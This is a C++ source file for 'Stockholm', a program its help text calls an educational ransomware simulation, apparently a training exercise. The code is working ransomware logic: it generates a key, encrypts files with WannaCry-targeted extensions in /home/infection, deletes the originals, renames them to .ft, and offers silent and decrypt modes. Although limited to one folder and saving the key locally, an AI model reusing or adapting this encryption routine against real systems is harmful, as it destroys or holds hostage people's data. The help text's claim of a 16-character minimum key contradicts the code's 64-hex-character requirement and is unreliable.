#include "../include/Stockholm.hpp"

Stockholm::Stockholm() : _reverse(false) , _silent(false)
{
	if (sodium_init() < 0)
		throw std::runtime_error("libsodium initialization failed.");

	this->_infection_folder = "/home/infection";

	this->_key.resize(crypto_secretstream_xchacha20poly1305_KEYBYTES);
	crypto_secretstream_xchacha20poly1305_keygen(_key.data());
}

Stockholm::~Stockholm() {}

void	Stockholm::parse_arg(int argc, std::vector<std::string> args)
{
	if (argc == 2)
	{
		if (isSilentOption(args[0]))
			setOption(args[0]);
		else
			throw std::runtime_error(args[0] + ": wrong argument.");
	}

	if (argc > 2)
	{
		if (isDecryptOption(args[0]))
			setOption(args[0]);
		else
			throw std::runtime_error(args[0] + ": wrong argument.");

		generateKey(args[1]);
		
		if (argc == 4)
		{
			if (isSilentOption(args[2]))
				setOption(args[2]);
			else
				throw std::runtime_error(args[2] + ": wrong argument.");
		}
	}
}

void	Stockholm::encryptFile(const fs::path& sourcePath)
{
	fs::path targetPath = sourcePath.string() + ".tmp";

	try
	{
		std::ifstream source(sourcePath, std::ios::binary);
		if (!source.is_open())
			throw std::runtime_error("cannot open source file.");
		std::ofstream target(targetPath, std::ios::binary);
		if (!target.is_open())
			throw std::runtime_error("cannot open target file.");

		std::vector<unsigned char> bufIn(CHUNK_SIZE);
		std::vector<unsigned char> bufOut(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
		std::vector<unsigned char> header(crypto_secretstream_xchacha20poly1305_HEADERBYTES);

		crypto_secretstream_xchacha20poly1305_state state;
		crypto_secretstream_xchacha20poly1305_init_push(&state, header.data(), _key.data());
		
		target.write(reinterpret_cast<char*>(header.data()), header.size());

		while (true)
		{
			source.read(reinterpret_cast<char*>(bufIn.data()), CHUNK_SIZE);
			std::streamsize bytesRead = source.gcount();

			bool isFinal = (bytesRead == 0) || (source.peek() == EOF);
			unsigned char tag = isFinal ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;

			unsigned long long outLen;
			crypto_secretstream_xchacha20poly1305_push(
				&state, bufOut.data(), &outLen,
				bufIn.data(), bytesRead,
				NULL, 0, tag
			);

			target.write(reinterpret_cast<char*>(bufOut.data()), outLen);

			if (isFinal)
				break ;
		}

		source.close();
		target.close();

		fs::remove(sourcePath);

		fs::path finalPath = sourcePath.string() + ".ft";
		fs::rename(targetPath, finalPath);

		if (!this->_silent)
			std::cout << "Encrypted: " << finalPath.filename() << std::endl;
	}
	catch(const std::exception& e)
	{
		if (!this->_silent)
		{
			std::cerr << "Error: " << sourcePath << "cannot encrypt file: ";
			std::cerr << e.what() << std::endl;
		}
	}
}

void	Stockholm::decryptFile(const fs::path& sourcePath)
{
	fs::path finalPath = sourcePath;
	finalPath.replace_extension("");
	fs::path targetPath = finalPath.string() + ".tmp";

	try
	{
		std::ifstream source(sourcePath, std::ios::binary);
		if (!source.is_open())
			throw std::runtime_error("cannot open source file.");
		std::ofstream target(targetPath, std::ios::binary);
		if (!target.is_open())
			throw std::runtime_error("cannot open target file.");

		std::vector<unsigned char> bufIn(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
		std::vector<unsigned char> bufOut(CHUNK_SIZE);
		std::vector<unsigned char> header(crypto_secretstream_xchacha20poly1305_HEADERBYTES);

		source.read(reinterpret_cast<char*>(header.data()), header.size());
		if (source.gcount() != static_cast<std::streamsize>(header.size()))
			throw std::runtime_error("header incomplete.");

		crypto_secretstream_xchacha20poly1305_state state;

		if (crypto_secretstream_xchacha20poly1305_init_pull(
				&state, header.data(), _key.data()
			) != 0)
			throw std::runtime_error("invalid key or corrupt header.");

		bool finalTagFound = false;
		while (source)
		{
			source.read(reinterpret_cast<char*>(bufIn.data()), bufIn.size());
			std::streamsize bytesRead = source.gcount();

			if (bytesRead == 0)
				break ;

			unsigned long long outLen;
			unsigned char tag;
			if (crypto_secretstream_xchacha20poly1305_pull(
					&state, bufOut.data(), &outLen, &tag,
					bufIn.data(), bytesRead,
					NULL, 0)
				!= 0)
				throw std::runtime_error("invalid key.");

			target.write(reinterpret_cast<char*>(bufOut.data()), outLen);

			if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL)
			{
				finalTagFound = true;
				break ;
			}
		}

		if (!finalTagFound)
			throw std::runtime_error("file truncated.");

		source.close();
		target.close();

		fs::remove(sourcePath);
		fs::rename(targetPath, finalPath);

		if (!this->_silent)
			std::cout << "Decrypted: " << finalPath.filename() << std::endl;
	}
	catch (const std::exception& e)
	{
		if (fs::exists(targetPath))
			fs::remove(targetPath);
		if (!this->_silent)
		{
			std::cerr << "Error: " << sourcePath.filename() << "cannot decrypt file: ";
			std::cerr << e.what() << std::endl;
		}
	}
}

void	Stockholm::wannaLock()
{
	checkInfectionDirectory();

	std::string key_str = getKeyAsString();

	fs::path keyFilePath = "encryption_key.txt";
	std::ofstream keyFile(keyFilePath);
	if (!keyFile.is_open())
		throw std::runtime_error("cannot open encryption_key.txt file.");

	keyFile << key_str;
	keyFile.close();

	if (!this->_silent)
	{
		std::cout << "=====================" << std::endl;
		std::cout << "Infection in progress" << std::endl;
		std::cout << "Encryption key generated in: " << keyFilePath << std::endl << std::endl;
	}

	for (const auto& file : fs::directory_iterator(this->_infection_folder))
	{
		if (file.is_regular_file())
		{
			std::string ext = file.path().extension().string();
			if (isTargetExtension(ext))
				encryptFile(file.path());
			else if (ext == ".ft" && !this->_silent)
				std::cout << file.path().filename() << ": file already encrypted." << std::endl;
		}
	}

	if (!this->_silent)
	{
		std::cout << "\nInfection done." << std::endl;
		std::cout << "=====================" << std::endl;
	}
}

void	Stockholm::wannaUnlock()
{
	checkInfectionDirectory();

	if (!this->_silent)
	{
		std::cout << "=====================" << std::endl;
		std::cout << "Reverse in progress" << std::endl << std::endl;
	}

	for (const auto& file : fs::directory_iterator(this->_infection_folder))
	{
		if (file.is_regular_file())
		{
			std::string ext = file.path().extension().string();
			if (ext == ".ft")
				decryptFile(file.path());
			else if (isTargetExtension(ext) && !this->_silent)
				std::cout << file.path().filename() << ": file is not encrypted." << std::endl;
		}
	}

	if (!this->_silent)
	{
		std::cout << "\nReverse done." << std::endl;
		std::cout << "=====================" << std::endl << std::endl;
	}
}

void	Stockholm::checkInfectionDirectory() const
{
	if (!fs::exists(this->_infection_folder))
		throw std::runtime_error(this->_infection_folder / " does not exist.");

	if (!fs::is_directory(this->_infection_folder))
		throw std::runtime_error(this->_infection_folder / " is not a directory.");
}

std::string	Stockholm::getKeyAsString() const
{
	std::stringstream ss;
	ss << std::hex << std::setfill('0');
	for (unsigned char byte : this->_key)
		ss << std::setw(2) << static_cast<int>(byte);

	return ss.str();
}

void	Stockholm::generateKey(const std::string& keyString)
{
	size_t expectedLen = crypto_secretstream_xchacha20poly1305_KEYBYTES * 2;

	if (keyString.length() != expectedLen)
		throw std::runtime_error("invalid key length (expected 64 hexadecimal characters).");

	this->_key.resize(crypto_secretstream_xchacha20poly1305_KEYBYTES);

	size_t bin_len;
	if (sodium_hex2bin(this->_key.data(), this->_key.size(),
					   keyString.c_str(), keyString.length(),
					   nullptr, &bin_len, nullptr) != 0)
	{
		throw std::runtime_error("invalid hexadecimal key.");
	}
}

void	Stockholm::setOption(std::string opt)
{
	this->_reverse |= (opt == "-r" || opt == "--reverse");
	this->_silent |= (opt == "-s" || opt == "--silent");
}

bool	Stockholm::isDecryptOption(std::string opt) const
{
	return (opt == "-r" || opt == "--reverse");
}

bool	Stockholm::isSilentOption(std::string opt) const
{
	return (opt == "-s" || opt == "--silent");
}

bool	Stockholm::isReverse() const
{
	return this->_reverse;
}

size_t	Stockholm::isTargetExtension(std::string ext) const
{
	return this->_wannaCry_extensions.count(ext);
}

void	Stockholm::version()
{
	std::cout << "Stockholm version 1.0" << std::endl;
}

void	Stockholm::help()
{
	std::cout << R"(stockholm - Educational ransomware simulation

Usage: stockholm [OPTIONS]

Options:
  -h, --help              Display this help message and exit
  -v, --version           Show program version and exit
  -r, --reverse <key>     Decrypt files using the provided key (min 16 chars)
  -s, --silent            Run without producing any output

Description:
  Encrypts files in /home/infection with WannaCry-targeted extensions.
  Encrypted files receive the .ft extension.

Examples:
  stockholm              Encrypt files in /home/infection
  stockholm -s           Encrypt silently
  stockholm -r mykey123  Decrypt files with the given key
)" << std::endl;

}
